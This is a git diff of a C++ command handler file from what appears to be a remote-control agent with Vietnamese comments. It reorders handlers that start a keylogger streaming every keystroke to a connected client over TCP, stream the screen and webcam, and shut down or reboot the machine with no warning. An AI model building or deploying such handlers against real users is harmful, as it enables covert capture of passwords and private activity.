@@ -77,6 +77,55 @@ json ProcessHandlers::captureScreen(const json &)
     return {{"type", "screenshot"}, {"success", true}, {"data", b64}};
 }
 
+// Screen Stream
+
+json ProcessHandlers::startScreenStream(const json &req)
+{
+    int fps = req.value("fps", 60);
+    ScreenStream::start(fps);
+
+    return {
+        {"type", "status"},
+        {"success", true},
+        {"message", "Screen streaming started"}};
+}
+
+json ProcessHandlers::stopScreenStream(const json &)
+{
+    ScreenStream::stop();
+    return {
+        {"type", "status"},
+        {"success", true},
+        {"message", "Screen streaming stopped"}};
+}
+
+// === KEYLOGGER HANDLERS ===
+json ProcessHandlers::startKeylog(const json &)
+{
+    // đăng ký callback gửi phím lại đúng client đã bật keylog
+    setKeyEventCallback([](int key)
+                        {
+        json msg = {
+            {"type","key_event"},
+            {"key_code", key}
+        };
+
+        AgentTcpServer::instance().sendJson(msg); });
+
+    startKeylogger();
+
+    return {
+        {"type", "status"},
+        {"success", true},
+        {"message", "Keylogger started"}};
+}
+
+json ProcessHandlers::stopKeylog(const json &)
+{
+    stopKeylogger();
+    return {{"type", "status"}, {"success", true}, {"message", "Keylogger stopped"}};
+}
+
 // Webcam Record
 // Biến toàn cục để giữ trạng thái của việc ghi hình, mặc dù
 // WebcamRecord hiện tại là static, chúng ta sẽ cần thay đổi logic
@@ -131,88 +180,7 @@ json ProcessHandlers::stopWebcamRecord(const json &)
     return {{"type", "status"}, {"success", true}, {"message", "Webcam stop signal sent."}};
 }
 
-// === SYSTEM CONTROL HANDLERS ===
-
-json ProcessHandlers::systemShutdown(const json &)
-{
-    // Lệnh tắt máy ngay lập tức, không có cảnh báo
-#ifdef _WIN32
-    // Windows: shutdown /s /t 0
-    std::system("shutdown /s /t 0");
-#else
-    // Linux/macOS: shutdown now
-    std::system("shutdown now");
-#endif
-    return {
-        {"type", "status"},
-        {"success", true},
-        {"message", "System shutdown command sent."}};
-}
-
-json ProcessHandlers::systemRestart(const json &)
-{
-    // Lệnh khởi động lại ngay lập tức, không có cảnh báo
-#ifdef _WIN32
-    // Windows: shutdown /r /t 0
-    std::system("shutdown /r /t 0");
-#else
-    // Linux/macOS: reboot
-    std::system("reboot");
-#endif
-    return {
-        {"type", "status"},
-        {"success", true},
-        {"message", "System restart command sent."}};
-}
-
-// === KEYLOGGER HANDLERS ===
-json ProcessHandlers::startKeylog(const json &)
-{
-    // đăng ký callback gửi phím lại đúng client đã bật keylog
-    setKeyEventCallback([](int key)
-                        {
-        json msg = {
-            {"type","key_event"},
-            {"key_code", key}
-        };
-
-        AgentTcpServer::instance().sendJson(msg); });
-
-    startKeylogger();
-
-    return {
-        {"type", "status"},
-        {"success", true},
-        {"message", "Keylogger started"}};
-}
-
-json ProcessHandlers::stopKeylog(const json &)
-{
-    stopKeylogger();
-    return {{"type", "status"}, {"success", true}, {"message", "Keylogger stopped"}};
-}
-
-json ProcessHandlers::startScreenStream(const json &req)
-{
-    int fps = req.value("fps", 60);
-    ScreenStream::start(fps);
-
-    return {
-        {"type", "status"},
-        {"success", true},
-        {"message", "Screen streaming started"}};
-}
-
-json ProcessHandlers::stopScreenStream(const json &)
-{
-    ScreenStream::stop();
-    return {
-        {"type", "status"},
-        {"success", true},
-        {"message", "Screen streaming stopped"}};
-}
-
-// === WEBCAM STREAM HANDLERS MỚI ===
+// === WEBCAM STREAM HANDLERS ===
 json ProcessHandlers::startWebcamStream(const json &req)
 {
     int fps = req.value("fps", 15);
@@ -246,10 +214,37 @@ json ProcessHandlers::stopWebcamStream(const json &)
         {"message", "Webcam streaming stopped"}};
 }
 
-// Trả về danh sách tất cả command mà server hỗ trợ.
-json ProcessHandlers::help(const json &)
+
+// === SYSTEM CONTROL HANDLERS ===
+
+json ProcessHandlers::systemShutdown(const json &)
 {
+    // Lệnh tắt máy ngay lập tức, không có cảnh báo
+#ifdef _WIN32
+    // Windows: shutdown /s /t 0
+    std::system("shutdown /s /t 0");
+#else
+    // Linux/macOS: shutdown now
+    std::system("shutdown now");
+#endif
     return {
-        {"type", "help"},
-        {"commands", {"list_processes", "start_process", "stop_process_pid", "list_applications", "start_application", "stop_application", "capture_screen", "start_keylog", "stop_keylog", "help"}}};
+        {"type", "status"},
+        {"success", true},
+        {"message", "System shutdown command sent."}};
+}
+
+json ProcessHandlers::systemRestart(const json &)
+{
+    // Lệnh khởi động lại ngay lập tức, không có cảnh báo
+#ifdef _WIN32
+    // Windows: shutdown /r /t 0
+    std::system("shutdown /r /t 0");
+#else
+    // Linux/macOS: reboot
+    std::system("reboot");
+#endif
+    return {
+        {"type", "status"},
+        {"success", true},
+        {"message", "System restart command sent."}};
 }
